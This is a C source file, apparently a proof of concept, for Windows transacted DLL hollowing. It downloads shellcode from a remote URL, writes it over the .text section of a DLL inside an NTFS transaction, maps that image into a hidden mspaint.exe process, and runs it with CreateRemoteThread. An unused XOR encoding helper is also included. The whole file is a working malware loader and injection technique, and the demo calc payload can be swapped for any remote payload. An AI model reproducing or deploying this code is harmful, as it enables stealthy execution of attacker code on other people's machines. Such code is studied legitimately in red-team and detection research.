#include <stdio.h>
#include <Windows.h>
#include <WinInet.h>
#include "pe_tool.h"
#include "nt_apis.h"
#pragma comment(lib, "WinInet.lib")
#pragma once
void ReportError(LPWSTR lpszFunction) 
{ 
    // Retrieve the system error message for the last-error code

    LPVOID lpMsgBuf;
    LPVOID lpDisplayBuf;
    DWORD dw = GetLastError(); 

    FormatMessageW(
        FORMAT_MESSAGE_ALLOCATE_BUFFER | 
        FORMAT_MESSAGE_FROM_SYSTEM |
        FORMAT_MESSAGE_IGNORE_INSERTS,
        NULL,
        dw,
        MAKELANGID(LANG_ENGLISH, SUBLANG_DEFAULT),
        (LPWSTR) &lpMsgBuf,
        0, NULL );

    // Display the error message and exit the process

    lpDisplayBuf = (LPVOID)LocalAlloc(LMEM_ZEROINIT, (lstrlenW((LPWSTR)lpMsgBuf) + lstrlenW((LPWSTR)lpszFunction) + 40) * sizeof(WCHAR)); 
	wprintf(L"%s failed with error %d: %s",lpszFunction, dw, lpMsgBuf);

    LocalFree(lpMsgBuf);
    LocalFree(lpDisplayBuf);
    ExitProcess(dw); 
}

bool HollowDLL(BYTE** mappedBaseAddr, UINT64* mappedBufSize, const BYTE* injectFile, DWORD injectFileSize, BYTE** shellcodeAddr) {
	HANDLE hTargetFile = INVALID_HANDLE_VALUE;
	HANDLE hTransaction = INVALID_HANDLE_VALUE;
	NTSTATUS NtStatus;
	BYTE* targetFile = NULL;

	OBJECT_ATTRIBUTES objAttr;
	objAttr.Length = sizeof(OBJECT_ATTRIBUTES);
	objAttr.RootDirectory = NULL;
	objAttr.ObjectName = NULL;
	objAttr.Attributes = 0x00000002L; //OBJ_INHERIT
	objAttr.SecurityDescriptor = NULL;
	objAttr.SecurityQualityOfService = NULL;
	HMODULE hNtdll = LoadLibraryW(L"ntdll.dll");
	LPNTCREATETRANSACTION lpNtCreateTransaction = (LPNTCREATETRANSACTION)GetProcAddress(hNtdll, "NtCreateTransaction");

	NtStatus = lpNtCreateTransaction(&hTransaction, TRANSACTION_ALL_ACCESS, &objAttr, NULL, NULL, 0, 0, 0, NULL, NULL);
	if (!NT_SUCCESS(NtStatus)) {
		ReportError(L"NtCreateTransaction");
		return false;
	}
	
	SECURITY_ATTRIBUTES secAttr;
	secAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
	secAttr.lpSecurityDescriptor = NULL;
	secAttr.bInheritHandle = TRUE;
	
	hTargetFile = CreateFileTransactedW(L"../libEGL.dll",
			GENERIC_WRITE | GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL, hTransaction, NULL, NULL);
	
	if (hTargetFile == INVALID_HANDLE_VALUE) {
		ReportError(L"CreateFileTransactedW");
		return false;
	}

	DWORD dwFileSize = GetFileSize(hTargetFile, NULL);
	DWORD dwBytesRead = 0;
	
	targetFile = (BYTE*)malloc(dwFileSize);
	if (!ReadFile(hTargetFile, targetFile, dwFileSize, (PDWORD)&dwBytesRead, NULL)) {
		ReportError(L"ReadFile");
		return false;
	}

	SetFilePointer(hTargetFile, 0, nullptr, FILE_BEGIN);
	PIMAGE_SECTION_HEADER pSec_hdr_txt = GetSectionHeaderByName(targetFile, ".text");
	PIMAGE_SECTION_HEADER pSec_hdr_rloc = GetSectionHeaderByName(targetFile, ".reloc");

	memcpy(targetFile + pSec_hdr_txt->PointerToRawData, injectFile, injectFileSize);
	memset(targetFile+pSec_hdr_rloc->PointerToRawData, 0, pSec_hdr_rloc->SizeOfRawData);
	DWORD dwBytesWritten = 0;
	if (!WriteFile(hTargetFile, targetFile, dwFileSize, (PDWORD)&dwBytesWritten, NULL)) {
		ReportError(L"WriteFile");
	}

	HANDLE hSection = NULL;
	LPNTCREATESECTION lpNtCreateSection = (LPNTCREATESECTION)GetProcAddress(hNtdll, "NtCreateSection");
	NtStatus = lpNtCreateSection(&hSection, SECTION_ALL_ACCESS, &objAttr, NULL, PAGE_READONLY, SEC_IMAGE, hTargetFile);
	
	if (!NT_SUCCESS(NtStatus)) {
		ReportError(L"NtCreateSection");
		return false;
	}
		
		
	STARTUPINFOA SI = {0,};
	PROCESS_INFORMATION PI;
	SI.cb = sizeof(SI);
	SI.dwFlags = STARTF_USEPOSITION | STARTF_USESIZE;
	CreateProcessA(NULL, "mspaint.exe", NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &SI, &PI);
	*mappedBufSize = 0;
	

	LPNTMAPVIEWOFSECTION lpNtMapViewOfSection = (LPNTMAPVIEWOFSECTION)GetProcAddress(hNtdll, "NtMapViewOfSection");
	NtStatus = lpNtMapViewOfSection(hSection, PI.hProcess, (void**)mappedBaseAddr, 0, 0, NULL, (PSIZE_T)mappedBufSize, ViewUnmap, 0, PAGE_READONLY);
	if (!NT_SUCCESS(NtStatus)) {
		ReportError(L"NtMapViewOfSection");
		return false;
	}
	CloseHandle(hSection);
	LPNTROLLBACKTRANSACTION lpNtRollbackTransaction = (LPNTROLLBACKTRANSACTION)GetProcAddress(hNtdll, "NtRollbackTransaction");
	/*
	lpNtRollbackTransaction(hTransaction, TRUE);
	if(!NT_SUCCESS(NtStatus)){
		ReportError(L"RollbackTransaction");
		return false;
	}
	*/

	*shellcodeAddr = *mappedBaseAddr + pSec_hdr_txt->VirtualAddress;
	DWORD entryPoint = 0;
	memcpy(&entryPoint, shellcodeAddr, sizeof(DWORD));
	HANDLE rThreadHandle = INVALID_HANDLE_VALUE;
	SECURITY_ATTRIBUTES sa;
	HANDLE hRthread = CreateRemoteThread(PI.hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)entryPoint, NULL, 0, NULL);

	free(targetFile);
	CloseHandle(hTransaction);
	CloseHandle(hTargetFile);
	CloseHandle(hSection);
	CloseHandle(hNtdll);
	return true;
}

void xorEnc(BYTE inpString[], int len, BYTE key) 
{ 
    for (int i = 0; i < len; i++) 
    { 
        inpString[i] = inpString[i] ^ key; 
    } 
} 

bool GetConnection(LPHINTERNET lphInternet, LPHINTERNET lphURL, wchar_t* url){
	wchar_t* header = L"Content-Type: application/x-www-form-urlencoded";
	*lphInternet = InternetOpenW(L"HTTP", 0, 0, 0, 0);
	if (*lphInternet == NULL){
		return false;
	}
	*lphURL =  InternetOpenUrlW(*lphInternet, url, header, wcslen(header), INTERNET_FLAG_KEEP_CONNECTION | INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_NO_COOKIES, 0);
	//*lphURL =  InternetOpenUrl(*lphInternet, url, NULL, 0, 0, 0);
	return true;
}

DWORD GetRemoteShellcode(LPHINTERNET lphURL, BYTE* shellcode){
	DWORD dwSize = 512;
	DWORD dwRead, dwWritten, dwTotalSize;

	BYTE* buf;
	wchar_t* query_res[512];

	bool res = HttpQueryInfoW(*lphURL, HTTP_QUERY_CONTENT_LENGTH, query_res, &dwRead, NULL);
	if(!res)
		return false;
	dwTotalSize = _wtoi((const wchar_t*)query_res);
	buf = (BYTE*)calloc(dwTotalSize, sizeof(BYTE));
	DWORD offset = 0;
	do {
        InternetQueryDataAvailable(*lphURL, &dwSize, 0, 0);
        InternetReadFile(*lphURL, (buf+offset), dwSize, &dwRead);
		offset+=dwRead;
    } while(dwRead != 0);
	memcpy(shellcode, buf, dwTotalSize);
	free(buf);
	return dwTotalSize;
}

int main() {
		wchar_t* url = L"https://raw.githubusercontent.com/peterferrie/win-exec-calc-shellcode/master/build/bin/w32-exec-calc-shellcode.bin";
		HINTERNET hInternet, hURL;
		BYTE shellcode[1024];
		GetConnection(&hInternet, &hURL,url);
		DWORD shellcode_len = GetRemoteShellcode(&hURL, shellcode);
		InternetCloseHandle(hInternet);

		BYTE* pBaseAddr = NULL;
		BYTE* pInjectedCodeAddr = NULL;
		UINT64 mappedBufSize;
		if (HollowDLL(&pBaseAddr, &mappedBufSize, shellcode, shellcode_len, &pInjectedCodeAddr)) {
			printf("Call Injected ShellCode 0x%p...\n", pInjectedCodeAddr);
		}

	return 0;
}